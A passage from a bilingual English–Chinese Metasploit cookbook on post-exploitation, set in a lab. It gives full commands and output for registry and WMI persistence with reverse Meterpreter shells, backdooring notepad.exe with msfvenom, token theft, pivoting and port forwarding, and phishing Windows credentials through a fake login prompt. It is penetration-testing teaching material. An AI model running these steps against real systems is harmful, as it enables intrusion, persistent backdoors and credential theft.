  \ password information for the KRBTGT account to create forged Kerberos tickets\
  \ (TGTs) that can then be used to request TGS tickets for any service on any computer\
  \ in the domain.\n\n金票和 Mimikatz：使用 Mimikatz，我们可以利用 KRBTGT 账户的密码信息创建伪造的 Kerberos\
  \ 票据（TGT），然后可用于向域中任何计算机上的任何服务请求 TGS 票据。\n\nAnother one of my favorite features is\
  \ the ability to use Mimikatz to implant skeleton keys using the misc module with\
  \ the skeleton command, which will patch LSASS to enable the use of a master password\
  \ for any valid domain user.\n\n我最喜欢的功能之一是能够使用 Mimikatz 通过 misc 模块的 skeleton 命令植入\
  \ skeleton key，这将修补 LSASS 以允许对任何有效域用户使用主密码。\n\n## 使用后门设置持久化\n\nIn this recipe, we\
  \ will learn how to establish a persistent connection with our target, allowing\
  \ us to connect to it at our will. As the attacker, we want to ensure we have access\
  \ to our target no matter what and backdooring the target can be effective for setting\
  \ persistent connections.\n\n在本教程中，我们将学习如何与目标建立持久连接，以便我们随时连接。作为攻击者，我们希望无论如何都能访问目标，对目标进行后门操作可以有效建立持久连接。\n\
  \n### 准备工作\n\nMetasploit has several persistence modules available. In this recipe,\
  \ we will have a look at some local and post-exploitation modules that we can use\
  \ to establish persistence on the target machine.\n\nMetasploit 有多个持久化模块可用。在本教程中，我们将查看一些可用于在目标机器上建立持久化的本地和后利用模块。\n\
  \n### 操作方法\n\n1. The first module we will try is the Windows Registry Only Persistence\
  \ exploit module. This module will install the complete payload in the registry,\
  \ which will be executed during booting up:\n\n1. 我们将尝试的第一个模块是 Windows 注册表仅持久化利用模块。该模块会将完整有效载荷安装到注册表中，并在启动期间执行：\n\
  \n```\nmsf exploit(psexec) > use exploit/windows/local/\nregistry_persistence\n\
  msf exploit(registry_persistence) > set SESSION 1\nSESSION => 1\nmsf exploit(registry_persistence)\
  \ > set STARTUP SYSTEM\nSTARTUP => SYSTEM\nmsf exploit(registry_persistence) > set\
  \ PAYLOAD\nwindows/meterpreter/reverse_https\nPAYLOAD => windows/meterpreter/reverse_https\n\
  msf exploit(registry_persistence) > set LHOST 192.168.216.5\nLHOST => 192.168.216.5\n\
  msf exploit(registry_persistence) > set LPORT 443\nLPORT => 443\nmsf exploit(registry_persistence)\
  \ > exploit\n...\n[*] Clean up Meterpreter RC file: /root/.msf4\n/logs/persistence/192.168.216.10_20171126.2103\n\
  /192.168.216.10_20171126.2103.rc\nmsf exploit(registry_persistence) >\n```\n\nNow\
  \ we just need to set up a listener and wait for the target machine to reboot.\n\
  \n现在我们只需设置一个监听器并等待目标机器重新启动。\n\n2. Another persistence module we will use is the\
  \ WMI Event Subscription Persistence local exploit module:\n\n2. 我们将使用的另一个持久化模块是\
  \ WMI 事件订阅持久化本地利用模块：\n\n```\nmeterpreter > migrate -N explorer.exe\n[*] Migrating\
  \ from 5280 to 5672...\n[*] Migration completed successfully.\nmeterpreter > background\n\
  [*] Backgrounding session 1...\nmsf exploit(psexec) > use exploit/windows/local/\n\
  wmi_persistence\nset SESSION 1\nSESSION => 1\nmsf exploit(wmi_persistence) > set\
  \ PAYLOAD\nwindows/meterpreter/reverse_tcp\nPAYLOAD => windows/meterpreter/reverse_tcp\n\
  msf exploit(wmi_persistence) > set LHOST 192.168.216.5\nLHOST => 192.168.216.5\n\
  msf exploit(wmi_persistence) > set LPORT 443\nLPORT => 443\n[*] Installing Persistence...\n\
  [+] - Bytes remaining: 12260\n[+] - Bytes remaining: 4260\n[+] Payload successfully\
  \ staged.\n[+] Persistence installed! Call a shell using\n\"smbclient \\\\\\\\192.168.216.10\\\
  \\C$ -U BOB\n<arbitrary password>\"\n[*] Clean up Meterpreter RC file: /root/.msf4\n\
  /logs/wmi_persistence/192.168.216.10_20171127.1028\n/192.168.216.10_20171127.1028.rc\n\
  msf exploit(wmi_persistence) >\n```\n\n3. With our persistence in place, we need\
  \ to start a listener using the Generic Payload Handler module:\n\n3. 在持久化就位后，我们需要使用通用有效载荷处理程序模块启动一个监听器：\n\
  \n```\nmsf exploit(wmi_persistence) > use exploit\n/multi/handler\nmsf exploit(handler)\
  \ > set PAYLOAD windows\n/meterpreter/reverse_tcp\nPAYLOAD => windows/meterpreter/reverse_tcp\n\
  msf exploit(handler) > set LHOST 192.168.216.5\nLHOST => 192.168.216.5\nmsf exploit(handler)\
  \ > set LPORT 443\nLPORT => 443\nmsf exploit(handler) > run\n\n[*] Started reverse\
  \ TCP handler on 192.168.216.5:443\n```\n\n4. To get a session back, we need to\
  \ generate an event ID 4625 (an account failed to log on) with the username BOB,\
  \ which will trigger the payload. For that, we will use the smbclient command:\n\
  \n4. 要重新获得会话，我们需要使用用户名 BOB 生成事件 ID 4625（账户登录失败），这将触发有效载荷。为此，我们将使用 smbclient 命令：\n\
  \n```\nroot@kali:~# smbclient \\\\\\\\192.168.216.10\\\\C$\n-U BOB BLA\nWARNING:\
  \ The \"syslog\" option is deprecated\nsession setup failed: NT_STATUS_LOGON_FAILURE\n\
  root@kali:~#\n```\n\n5. Back in the msfconsole, we should receive a new Meterpreter\
  \ session:\n\n5. 回到 msfconsole，我们应该会收到一个新的 Meterpreter 会话：\n\n```\n[*] Sending stage\
  \ (179267 bytes) to 192.168.216.10\n[*] Meterpreter session 2 opened (192.168.216.5:443\
  \ -> 192.168.216.10:50036) at 2017-11-27 16:11:29 -0500\n\nmeterpreter > getuid\n\
  Server username: NT AUTHORITY\\SYSTEM\nmeterpreter >\n```\n\n## 成为 TrustedInstaller\n\
  \nAnother way to gain persistence is to backdoor a service binary. So, let's try\
  \ to backdoor a Windows binary in the Windows 10 target machine.\n\n另一种获得持久化的方法是对服务二进制文件进行后门操作。因此，让我们尝试对\
  \ Windows 10 目标机器中的 Windows 二进制文件进行后门操作。\n\n### 操作方法\n\n- 1. First, we will download\
  \ notepad.exe to our Kali machine using the download command:\n\n- 1. 首先，我们将使用 download\
  \ 命令将 notepad.exe 下载到我们的 Kali 机器上：\n\n```\nmeterpreter > pwd\nC:\\Windows\\system32\n\
  meterpreter > download notepad.exe\n[*] Downloading: notepad.exe -> notepad.exe\n\
  [*] Downloaded 227.00 KiB of 227.00 KiB (100.0%):\nnotepad.exe -> notepad.exe\n\
  [*] download : notepad.exe -> notepad.exe\nmeterpreter >\n```\n\nUse the pwd command\
  \ to make sure you are on the C:\\Windows\\system32 directory where notepad.exe\
  \ is located. If not, use the cd command to change to the proper directory (don't\
  \ forget to use double backslashes):\nC:\\\\Windows\\\\system32.\n\n使用 pwd 命令确保您位于\
  \ notepad.exe 所在的 C:\\Windows\\system32 目录。如果不是，请使用 cd 命令更改到正确的目录（不要忘记使用双反斜杠）：\n\
  C:\\\\Windows\\\\system32.\n\n![](img/6b6e557533100c0e47951d0e5e14c4ee_570_0.png)\n\
  \n2. Now that we have a copy of the binary, let's try to remove the original:\n\n\
  2. 现在我们有了二进制文件的副本，让我们尝试删除原始文件：\n\n```\nmeterpreter > getsystem\n...got system via\
  \ technique 1 (Named Pipe Impersonation (In Memory/Admin)).\nmeterpreter > rm notepad.exe\n\
  [-] stdapi_fs_delete_file: Operation failed:\nAccess is denied.\nmeterpreter >\n\
  ```\n\nAs you can see, although we are running with system privileges, we are unable\
  \ to delete the original file. This happens because of TrustedInstaller, a Windows\
  \ Module Installer service which is part of Windows Resource Protection. This restricts\
  \ access to certain core system files, folders, and registry keys that are part\
  \ of the Windows OS.\n\n如你所见，尽管我们以系统权限运行，但仍无法删除原始文件。这是因为 TrustedInstaller，一个 Windows\
  \ 模块安装程序服务，属于 Windows 资源保护的一部分。它限制了对 Windows 操作系统一部分的某些核心系统文件、文件夹和注册表项的访问。\n\n3.\
  \ So, before we can backdoor the service, we need to remove the original file. For\
  \ that, we will use the steal_token Meterpreter command to steal the authentication\
  \ token and gain the privileges of TrustedInstaller. First, we will start the TrustedInstaller\
  \ service:\n\n3. 因此，在对服务进行后门操作之前，我们需要删除原始文件。为此，我们将使用 steal_token Meterpreter 命令窃取身份验证令牌并获得\
  \ TrustedInstaller 的权限。首先，我们将启动 TrustedInstaller 服务：\n\n```\nmeterpreter > shell\n\
  Process 4836 created.\nChannel 2 created.\nMicrosoft Windows [Version 10.0.10586]\n\
  (c) 2016 Microsoft Corporation. All rights reserved.\n\nC:\\Windows\\system32>sc\
  \ start TrustedInstaller\nsc start TrustedInstaller\n...\nIGNORES_SHUTDOWN)\n  \
  \  WIN32_EXIT_CODE : 0 (0x0)\n    SERVICE_EXIT_CODE : 0 (0x0)\n    CHECKPOINT :\
  \ 0x0\n    WAIT_HINT : 0x7d0\n    PID : 3420\n    FLAGS :\n\nC:\\Windows\\system32>\n\
  ```\n\n4. With the service up and running, we can use the ps command to get the\
  \ PID of the TrustedInstaller, use the steal_token followed by the PID to steal\
  \ the token, and finally remove the original notepad.exe file:\n\n4. 在服务运行后，我们可以使用\
  \ ps 命令获取 TrustedInstaller 的 PID，使用 steal_token 后跟 PID 来窃取令牌，最后删除原始 notepad.exe\
  \ 文件：\n\n```\nmeterpreter > ps TrustedInstaller\nFiltering on 'TrustedInstaller'\n\
  \nProcess List\n-------------\n```\n\n| PID | PPID | 名称 | 架构 | 会话 | 用户 | 路径 |\n\
  |---|---|---|---|---|---|---|\n| 3420 | 728 | TrustedInstaller.exe | x86 | 0 | NT\
  \ AUTHORITY\\SYSTEM | C:\\Windows\\servicing\\TrustedInstaller.exe |\n\n```\nmeterpreter\
  \ > steal_token 3420\nStolen token with username: NT AUTHORITY\\SYSTEM\nmeterpreter\
  \ > rm notepad.exe\nmeterpreter >\n```\n\nGreat! Now that we have successfully removed\
  \ the binary, let's move on to the next recipe and see how we can backdoor it.\n\
  \n太好了！现在我们已成功删除二进制文件，让我们继续下一个教程，看看如何对其进行后门操作。\n\n## 后门 Windows 二进制文件\n\nBy backdooring\
  \ system binaries, we can ensure that we will have persistence in the target machine,\
  \ and we won't trigger alarms by adding new registry entries or new binaries to\
  \ the system.\n\n通过对系统二进制文件进行后门操作，我们可以确保在目标机器上获得持久化，并且不会通过添加新的注册表项或新二进制文件到系统来触发警报。\n\
  \n### 操作方法\n\n- 1. We will use msfvenom to backdoor the notepad.exe binary:\n  -\
  \ Use -a for the architecture, in this case, x86\n  - --platform for the platform\
  \ of the payload Windows\n  - -p, for the payload to use\n    windows/meterpreter/reverse_tcp,\
  \ LHOST followed by the IP address of our Kali machine\n  - -x to specify a custom\
  \ executable file to use as a template; in this recipe, we will use notepad.exe\n\
  \  - -k to preserve the template behavior and inject the payload as a new thread\n\
  \  - -f for the output format\n\n- 1. 我们将使用 msfvenom 对 notepad.exe 二进制文件进行后门操作：\n\
  \  - 使用 -a 指定架构，在本例中为 x86\n  - --platform 指定有效载荷的平台 Windows\n  - -p 指定要使用的有效载荷\n\
  \    windows/meterpreter/reverse_tcp，LHOST 后跟我们的 Kali 机器的 IP 地址\n  - -x 指定要用作模板的自定义可执行文件；在本教程中，我们将使用\
  \ notepad.exe\n  - -k 保留模板行为并将有效载荷作为新线程注入\n  - -f 指定输出格式\n\n\n\n- `-b` 指定要避免的字符；在本例中为空字节\
  \ `\"\\x00\"`，以及 `-o` 指定有效载荷的输出名称：\n\n```\nroot@kali:~# msfvenom -a x86 --platform\
  \ Windows -p windows/meterpreter/reverse_tcp LHOST=192.168.216.5 -x notepad.exe\
  \ -k -f exe -b \"\\x00\" -o notepad-backdoored.exe\nFound 10 compatible encoders\n\
  Attempting to encode payload with 1 iterations of x86/shikata_ga_nai\nx86/shikata_ga_nai\
  \ succeeded with size 360\n(iteration=0)\nx86/shikata_ga_nai chosen with final size\
  \ 360\nPayload size: 360 bytes\nFinal size of exe file: 353280 bytes\nSaved as:\
  \ notepad-backdoored.exe\nroot@kali:~#\n```\n\n2. 现在我们已经对 `notepad.exe` 二进制文件植入了后门，我们将返回\
  \ Meterpreter 会话并上传我们的后门：\n\n```\nmeterpreter > upload notepad-backdoored.exe\n\
  [*] uploading : notepad-backdoored.exe -> notepad-backdoored.exe\n[*] uploaded :\
  \ notepad-backdoored.exe -> notepad-backdoored.exe\nmeterpreter > mv notepad-backdoored.exe\
  \ notepad.exe\nmeterpreter >\n```\n\n3. 然后，我们需要启动一个监听器，以便每次用户启动 `notepad.exe` 时都能获得一个新的\
  \ Meterpreter 会话：\n\n```\nmeterpreter > background\n[*] Backgrounding session 1...\n\
  msf exploit(web_delivery) > use exploit/multi/handler\nmsf exploit(handler) > set\
  \ PAYLOAD windows/meterpreter/reverse_tcp\nPAYLOAD => windows/meterpreter/reverse_tcp\n\
  msf exploit(handler) > set LHOST 192.168.216.5\nLHOST => 192.168.216.5\nmsf exploit(handler)\
  \ > run -j\n[*] Exploit running as background job 0.\n[*] Started reverse TCP handler\
  \ on 192.168.216.5:4444\nmsf exploit(handler) >\n```\n\n4. 要测试后门，请登录 Windows 10\
  \ 目标机器并启动 notepad.exe：\n\n```\nmsf exploit(handler) > [*] Sending stage\n(179267\
  \ bytes) to 192.168.216.145\n[*] Meterpreter session 2 opened\n(192.168.216.5:4444\
  \ -> 192.168.216.145:49721)\nat 2017-12-08 04:15:07 -0500\n\nmsf exploit(handler)\
  \ > sessions 2\n[*] Starting interaction with 2...\n\nmeterpreter > getpid\nCurrent\
  \ pid: 4228\nmeterpreter > ps notepad.exe\nFiltering on 'notepad.exe'\n\nProcess\
  \ List\n===========\n\n| PID | PPID | Name | Arch | Session | User | Path |\n|---|---|---|---|---|---|---|\n\
  | 4228 | 3304 | notepad.exe | x86 | 1 | DESKTOP-OJI4NFS\\User | C:\\Windows\\System32\\\
  notepad.exe |\n\nmeterpreter >\n```\n\n现在只要用户启动 notepad.exe，我们就会获得一个新的 Meterpreter\
  \ 会话。\n\n## 使用 Meterpreter 进行 Pivot\n\n到目前为止，Meterpreter 已证明是后利用中最强大的工具之一。在本教程中，我们将介绍另一种有用的技术，称为\
  \ pivot。让我们先通过了解 pivot 的含义、为什么需要它以及 Metasploit 如何对 pivot 有用，来开始本教程。\n\n## 准备工作\n\
  \n在开始教程之前，让我们先详细了解 pivot。Pivot 是渗透测试人员使用的一种方法，利用已受妥协的系统来攻击同一网络上的其他系统。这是一种多层攻击，我们甚至可以访问仅供本地内部使用的网络区域，例如内联网。请考虑以下图所示的场景：\n\
  \n![](img/6b6e557533100c0e47951d0e5e14c4ee_575_0.png)\n\n攻击者可以入侵一台连接到互联网的 Web 服务器。然后，攻击者利用受妥协的服务器访问内部网络。这是一个典型的涉及\
  \ pivot 的场景。在我们的实验室中，我们使用双网卡服务器来模拟具有 LAN 网络访问权限的面向互联网的服务器；这样我们就避免安装另一台机器充当防火墙。\n\
  \n要为本教程设置 Windows 10 客户端机器，我们首先需要配置虚拟机的网络适配器，使其使用 10.0.0.0/24 网络，将接口从 NAT 更改为自定义网络。然后，我们将禁用\
  \ Windows 10 防火墙并添加一个新的注册表项，允许我们像客户端是域的一部分一样使用 Microsoft Windows 身份验证用户代码执行攻击。\n\
  \n添加一个新的 DWORD（32 位）键 LocalAccountTokenFilterPolicy 到 HKEY_LOCAL_MACHINE/SOFTWARE/Microsoft/Windows/CurrentVersion/Policies/System\
  \ 并将值设置为 1：\n\n![](img/6b6e557533100c0e47951d0e5e14c4ee_576_0.png)\n\n## 如何操作...\n\
  \n- 1. 首先，我们将使用 Samba “username map script” 命令执行漏洞利用程序（我们之前已使用过）来攻击 Linux 服务器：\n\
  \n```\nmsf > use exploit/multi/samba/usermap_script\nmsf exploit(usermap_script)\
  \ > set\nRHOST 192.168.216.129\nRHOST => 192.168.216.129\nmsf exploit(usermap_script)\
  \ > exploit\n\n[*] Started reverse TCP double handler\non 192.168.216.5:4444\n[*]\
  \ Accepted the first client connection...\n[*] Accepted the second client connection...\n\
  [*] Command: echo TdPeM5eMnWjlpuK5;\n[*] Writing to socket A\n[*] Writing to socket\
  \ B\n[*] Reading from sockets...\n[*] Reading from socket B\n[*] B: \"TdPeM5eMnWjlpuK5\\\
  r\\n\"\n[*] Matching...\n[*] A is input...\n[*] Command shell session 1 opened\n\
  (192.168.216.5:4444 -> 192.168.216.129:41027)\nat 2017-12-08 06:35:53 -0500\n\n\
  ^Z\nBackground session 1? [y/N] y\nmsf exploit(usermap_script) >\n```\n\n- 2. 现在我们有了会话，我们将使用带\
  \ -u 选项的 sessions 命令将 shell 升级为 Meterpreter 会话：\n\n```\nmsf exploit(usermap_script)\
  \ > sessions -u 1\n[*] Executing 'post/multi/manage\n/shell_to_meterpreter' on session(s):\
  \ [1]\n\n[*] Upgrading session ID: 1\n[*] Starting exploit/multi/handler\n[*] Started\
  \ reverse TCP handler on 192.168.216.5:4433\n[*] Sending stage (847604 bytes) to\
  \ 192.168.216.129\n[*] Meterpreter session 2 opened\n(192.168.216.5:4433 -> 192.168.216.129:41205)\n\
  at 2017-12-08 06:37:08 -0500\n[*] Sending stage (847604 bytes) to 192.168.216.129\n\
  [*] Meterpreter session 3 opened (192.168.216.5:4433 -> 192.168.216.129:41206) at\
  \ 2017-12-08 06:37:13 -0500\n[*] Command stager progress: 100.00% (736/736 bytes)\n\
  msf exploit(usermap_script) >\n```\n\n3. 使用我们新创建的 Meterpreter 会话，我们可以在目标上使用 `ifconfig`\
  \ 命令查看可用的接口：\n\n```\nmsf exploit(usermap_script) > sessions 2\n[*] Starting interaction\
  \ with 2...\n\nmeterpreter > ifconfig\n\nInterface 1\n==========\nName         \
  \ : lo\nHardware MAC  : 00:00:00:00:00:00\nMTU           : 16436\nFlags        \
  \ : UP, LOOPBACK\nIPv4 Address  : 127.0.0.1\nIPv4 Netmask  : 255.0.0.0\nIPv6 Address\
  \  : ::1\nIPv6 Netmask  : ffff:ffff:ffff:ffff:ffff:ffff::\n\n...\n\nmeterpreter\
  \ >\n```\n\n如你所见，目标节点有三个接口。`LOOPBACK` 接口，一个 IP 地址为 192.168.216.129（连接到互联网），另一个 IP\
  \ 地址为 10.0.0.128，是内部网络的 IP 接口。\n\n4. 我们的下一个目标是找到此本地网络上有哪些系统可用。为此，我们将使用 Multi Gather\
  \ Ping Sweep 后利用模块：\n\n```\nmeterpreter > background\n[*] Backgrounding session\
  \ 2...\nmsf exploit(usermap_script) > use post/multi/\ngather/ping_sweep\nmsf post(ping_sweep)\
  \ > set RHOSTS 10.0.0.0/24\nRHOSTS => 10.0.0.0/24\nmsf post(ping_sweep) > set SESSION\
  \ 2\nSESSION => 2\nmsf post(ping_sweep) > run\n\n[*] Performing ping sweep for IP\
  \ range 10.0.0.0/24\n```\n\n```\n[+] 10.0.0.161 host found\n[*] Post module execution\
  \ completed\nmsf post(ping_sweep) >\n```\n\n该模块能够在网络上发现一台新主机。让我们尝试 pivot 并入侵该主机。\n\
  \n## 原理...\n\n要访问 10.0.0.0/24 网络中的目标，我们必须将所有数据包通过 IP 地址为 192.168.216.129 的受妥协 Linux\
  \ 机器进行路由。\n\n- 1. 为此，我们将使用 route 命令，该命令会将发往给定子网的流量通过提供的会话进行路由：\n\n```\nmsf post(ping_sweep)\
  \ > route add 10.0.0.0/24 2\n[*] Route added\nmsf post(ping_sweep) > route print\n\
  \nIPv4 Active Routing Table\n=======================\n\n| Subnet | Netmask | Gateway\
  \ |\n|---|---|---|\n| 10.0.0.0 | 255.255.255.0 | Session 2 |\n\n[*] There are currently\
  \ no IPv6 routes defined.\nmsf post(ping_sweep) >\n```\n\n查看 route 命令的参数。add 参数会将详细信息添加到路由表中。然后，我们提供了目标网络的地址，后跟我们将在\
  \ recipe 会话 2 中用于访问网络的 Meterpreter 会话 ID。\n\n- 2. 现在，你可以使用 TCP 端口扫描器辅助模块对 IP 地址\
  \ 10.0.0.161 进行快速端口扫描：\n\n```\nmsf post(ping_sweep) > use auxiliary/scanner\n/portscan/tcp\n\
  msf auxiliary(tcp) > set RHOSTS 10.0.0.161\nRHOSTS => 10.0.0.161\nmsf auxiliary(tcp)\
  \ > set PORTS 1-500\nPORTS => 1-500\nmsf auxiliary(tcp) > set THREADS 100\nTHREADS\
  \ => 100\n```\n\n\n\n```\nmsf auxiliary(tcp) > run\n\n[+] 10.0.0.161:139 - 10.0.0.161:139\
  \ - TCP OPEN\n[+] 10.0.0.161:135 - 10.0.0.161:135 - TCP OPEN\n[+] 10.0.0.161:445\
  \ - 10.0.0.161:445 - TCP OPEN\n[*] Scanned 1 of 1 hosts (100% complete)\n[*] Auxiliary\
  \ module execution completed\nmsf auxiliary(tcp) >\n```\n\n3. 现在我们知道目标正在运行 SMB，我们可以使用\
  \ SMB 版本检测辅助模块来显示有关系统的信息：\n\n```\nmsf auxiliary(tcp) > use auxiliary/scanner/smb/smb_version\n\
  msf auxiliary(smb_version) > set RHOSTS 10.0.0.161\nRHOSTS => 10.0.0.161\nmsf auxiliary(smb_version)\
  \ > run\n\n[+] 10.0.0.161:445 - Host is running Windows 10 Enterprise (build:10586)\
  \ (name:DESKTOP-OJI4NFS) (workgroup:WORKGROUP)\n[*] Scanned 1 of 1 hosts (100% complete)\n\
  [*] Auxiliary module execution completed\nmsf auxiliary(smb_version) >\n```\n\n\
  4. 借助收集到的信息，我们可以使用 Microsoft Windows 身份验证用户代码执行漏洞利用模块，并使用在后利用阶段收集的凭据来尝试入侵目标机器：\n\
  \n```\nmsf auxiliary(smb_version) > use exploit/windows/smb/psexec\nmsf exploit(psexec)\
  \ > set RHOST 10.0.0.161\nRHOST => 10.0.0.161\nmsf exploit(psexec) > set SMBUSER\
  \ User\nSMBUSER => User\nmsf exploit(psexec) > set SMBPASS P4ssw0rd\nSMBPASS =>\
  \ P4ssw0rd\nmsf exploit(psexec) > set PAYLOAD windows/meterpreter/bind_tcp\nPAYLOAD\
  \ => windows/meterpreter/bind_tcp\nmsf exploit(psexec) > run\n\n...\n\nmeterpreter\
  \ > sysinfo\nComputer : WINDOWS10\nOS : Windows 10 (Build 10586).\nArchitecture\
  \ : x86\nSystem Language : pt_PT\nDomain : WORKGROUP\nLogged On Users : 2\nMeterpreter\
  \ : x86/windows\nmeterpreter >\n```\n\n## 使用 Meterpreter 进行端口转发\n\n讨论枢轴转向而不谈端口转发是不完整的。在本教程中，我们将继续之前的枢轴转向教程，看看如何通过目标节点将攻击机器的数据和请求端口转发到内部网络服务器。这里需要注意的重要一点是，我们可以使用端口转发来访问内部服务器的各种服务。\n\
  \n### 准备工作\n\n我们将从之前教程中讨论的相同场景开始。我们已经入侵了 Linux 服务器，并添加了路由信息以将网络上发送的所有数据包通过 Meterpreter\
  \ 会话转发。让我们来看一下路由表：\n\n```\nmsf > route\n\nIPv4 Active Routing Table\n======================\n\
  \nSubnet Netmask Gateway\n------ ------- -------\n10.0.0.0 255.255.255.0 Session\
  \ 2\n\n[*] There are currently no IPv6 routes defined.\nmsf >\n```\n\n因此，我们的表已经设置完毕。现在我们需要设置端口转发，以便我们的请求能够中继到内部网络。\n\
  \n### 如何操作...\n\n1. 对于本教程，我们将在目标 Windows 10 机器上打开 Internet Information Services\
  \ 并尝试通过端口转发访问它：\n\n![](img/6b6e557533100c0e47951d0e5e14c4ee_582_0.png)\n\n```\n\
  meterpreter > portfwd -h\nUsage: portfwd [-h] [add | delete | list | flush] [args]\n\
  \nOPTIONS:\n    -L <opt> Forward: local host to listen on\n(optional).\nReverse:\
  \ local host to connect to.\n    -R Indicates a reverse port forward.\n    -h Help\
  \ banner.\n    -i <opt> Index of the port forward entry to\ninteract with (see the\
  \ \"list\" command).\n    -l <opt> Forward: local port to listen on.\nReverse: local\
  \ port to connect to.\n    -p <opt> Forward: remote port to connect to.\nReverse:\
  \ remote port to listen on.\n    -r <opt> Forward: remote host to connect to.\n\
  meterpreter > portfwd add -l 8080 -p 80 -r 10.0.0.161\n[*] Local TCP relay created:\
  \ :8080 <-> 10.0.0.161:80\nmeterpreter >\n```\n\n成功执行该命令表明攻击者与内部服务器之间已建立本地 TCP 中继。攻击者机器上的监听端口设置为\
  \ 8080，而要访问的内部服务器上的服务位于 80 端口。\n\n- 2. 由于我们已经设置了路由信息，整个中继过程是透明的。现在如果我们尝试通过浏览器使用\
  \ URL http://127.0.0.1:8080 访问内部服务器，我们将被定向到内部网络的 HTTP 局域网服务：\n\n![](img/6b6e557533100c0e47951d0e5e14c4ee_583_0.png)\n\
  \n端口转发在需要运行 Metasploit 未提供的命令或应用程序的情况下非常方便。在这种情况下，您可以使用端口转发来简化任务。\n\n## 凭据收割\n\n\
  在渗透测试期间，我们并不总是获得系统甚至管理员权限的会话；大多数情况下，我们最终会得到一个来自成功钓鱼的会话，该会话以用户权限运行。这时凭据收割就派上用场了。通过凭据收割，我们将尝试对目标进行钓鱼攻击，以收集用户名、密码和哈希值，这些信息可用于进一步入侵组织。\n\
  \n### 如何操作...\n\n为了收割凭据，我们将使用 Windows 收集用户凭据后利用模块，通过弹出登录提示对目标执行钓鱼攻击。\n\n- 1. 当用户在登录提示中输入其凭据时，这些凭据将被发送到我们的攻击者机器：\n\
  \n```\nmsf > use post/windows/gather/phish_windows_credentials\nmsf post(phish_windows_credentials)\
  \ > set SESSION 1\nSESSION => 1\nmsf post(phish_windows_credentials) > run\n\n[+]\
  \ PowerShell is installed.\n[*] Starting the popup script. Waiting on the user to\
  \ fill in his credentials...\n[+] #< CLIXML\n```\n\n2. 在目标机器上，我们应该会看到登录提示，等待用户填写其凭据：\n\
  \n![](img/6b6e557533100c0e47951d0e5e14c4ee_585_0.png)\n\n3. 当用户填写登录提示时，其凭据将被发送到我们的攻击者机器：\n\
  \n```\n[+] UserName Domain Password\n--------- ------ --------\nUser WINDOWS10 P4ssw0rd\n\
  \n[*] Post module execution completed\nmsf post(phish_windows_credentials) >\n```\n\
  \n太好了！查看模块的输出，我们可以看到我们成功收集了用户的凭据。\n\n## 枚举模块\n\n成功入侵目标后，我们的下一个任务是开始枚举。获得会话只是开始；随着每次新的入侵，我们的目标都有大量信息，我们作为渗透测试人员可以利用这些信息来尝试提升权限并开始向内部网络中的其他目标进行枢轴转向。\n\
  \n### 如何操作...\n\n- 1. 我们将通过使用 Windows 收集已安装应用程序枚举后利用模块开始枚举，该模块将枚举所有已安装的应用程序：\n\n\
  ```\nmsf > use post/windows/gather/enum_applications\nmsf post(enum_applications)\
  \ > set SESSION 1\nSESSION => 1\nmsf post(enum_applications) > run\n\n[*] Enumerating\
  \ applications installed on VAGRANT-2008R2\n\nInstalled Applications\n====================\n\
  ```\n\n| 名称 | 版本 |\n|---|---|\n| 7-Zip 16.04 (x64) | 16.04 |\n| Java 8 Update 144\
  \ | 8.0.1440.1 |\n| Java 8 Update 144 (64-bit) | 8.0.1440.1 |\n| Java Auto Updater\
  \ | 2.8.144.1 |\n| Java SE Development Kit 8 Update 144 (64-bit) | 8.0.1440.1 |\n\
  | ... | ... |\n\n```\nmsf post(enum_applications) >\n```\n\n查看模块的输出，我们可以看到这在渗透测试期间如何有用。知道目标中安装了哪些应用程序将有助于我们找到可能的权限提升漏洞。\n\
  \n2. 为了进一步提高入侵组织的几率，我们可以使用 Windows 收集 SNMP 设置枚举后利用模块。该模块将允许我们枚举 SNMP 服务配置，并枚举 SNMP\
  \ 社区字符串，这些字符串可用于入侵网络中的其他目标：\n\n```\nmsf post(enum_applications) > use post/windows/gather/enum_snmp\n\
  msf post(enum_snmp) > set SESSION 1\nSESSION => 1\nmsf post(enum_snmp) > run\n\n\
  ..:\n[*] No Traps are configured\n[*] Post module execution completed\nmsf post(enum_snmp)\
  \ >\n```\n\n3. 接下来，我们可以使用 Windows 收集已登录用户枚举后利用模块尝试枚举当前和最近登录的 Windows 用户：\n\n```\n\
  msf post(enum_snmp) > use post/windows/gather/enum_logged_on_users\nmsf post(enum_logged_on_users)\
  \ > set SESSION 1\nSESSION => 1\nmsf post(enum_logged_on_users) > run\n\n[*] Running\
  \ against session 1\n\nCurrent Logged Users\n===================\n```\n\n| SID |\
  \ 用户 |\n|---|---|\n| S-1-5-18 | NT AUTHORITY\\SYSTEM |\n| S-1-5-21-653170132-1988196614-1572848168-1002\
  \ | VAGRANT-2008R2\\sshd_server |\n| S-1-5-21-653170132-1988196614-1572848168-500\
  \ | VAGRANT-2008R2\\Administrator |\n\n```\n..:\n[*] Post module execution completed\n\
  msf post(enum_logged_on_users) >\n```\n\n\n\nMetasploit 有多个模块可以帮助你在后利用阶段进行枚举，因此我建议你尝试它们并学习它们如何在渗透测试中帮助你：\n\
  \n```\nmsf > use post/windows/gather/enum_\nuse post/windows/gather/enum_ad_bitlocker\n\
  use post/windows/gather/enum_ad_computers\nuse post/windows/gather/enum_ad_groups\n\
  use post/windows/gather/enum_ad_managedby_groups\nuse post/windows/gather/enum_ad_service_principal_names\n\
  use post/windows/gather/enum_ad_to_wordlist\nuse post/windows/gather/enum_ad_user_comments\n\
  use post/windows/gather/enum_ad_users\nuse post/windows/gather/enum_applications\n\
  use post/windows/gather/enum_artifacts\nuse post/windows/gather/enum_av_excluded\n\
  use post/windows/gather/enum_chrome\nuse post/windows/gather/enum_computers\nuse\
  \ post/windows/gather/enum_db\nuse post/windows/gather/enum_devices\nuse post/windows/gather/enum_dirperms\n\
  use post/windows/gather/enum_domain\nuse post/windows/gather/enum_domain_group_users\n\
  use post/windows/gather/enum_domain_tokens\nuse post/windows/gather/enum_domain_users\n\
  use post/windows/gather/enum_domains\nuse post/windows/gather/enum_emet\nuse post/windows/gather/enum_files\n\
  use post/windows/gather/enum_hostfile\nuse post/windows/gather/enum_ie\nuse post/windows/gather/enum_logged_on_users\n\
  use post/windows/gather/enum_ms_product_keys\nuse post/windows/gather/enum_mui_cache\n\
  use post/windows/gather/enum_patches\nuse post/windows/gather/enum_powershell_env\n\
  use post/windows/gather/enum_prefetch\nuse post/windows/gather/enum_proxy\nuse post/windows/gather/enum_putty_saved_sessions\n\
  use post/windows/gather/enum_services\nuse post/windows/gather/enum_shares\nuse\
